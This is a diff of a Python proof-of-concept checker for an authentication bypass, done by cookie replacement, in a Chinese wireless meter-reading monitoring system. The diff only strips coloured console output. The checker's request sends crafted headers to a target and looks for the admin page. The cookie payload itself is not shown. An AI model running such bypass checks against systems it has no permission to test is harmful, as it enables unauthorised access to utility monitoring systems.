@@ -9,8 +9,7 @@ description: 替换COOKIE可达到绕过登录的目的。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
 
 class wireless_monitor_priv_elevation_BaseVerify:
     def __init__(self, url):
@@ -26,18 +25,14 @@ class wireless_monitor_priv_elevation_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if "无线抄表监控管理系统" in req.text:
-                cprint("[+]存在新力热电无线抄表管理系统后台绕过...(高危)\tpayload: "+vulnurl+"\tpost: Cookie:"+json.dumps(headers["Cookie"]), "red")
                 return True, vulnurl, "新力热电无线抄表监控系统绕过后台登录", str(payload), req.text
             else:
-                cprint("[-]不存在wireless_monitor_priv_elevation漏洞", "white", "on_grey")
                 return False, None, None, None, None
 
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = wireless_monitor_priv_elevation_BaseVerify(sys.argv[1])
     testVuln.run()
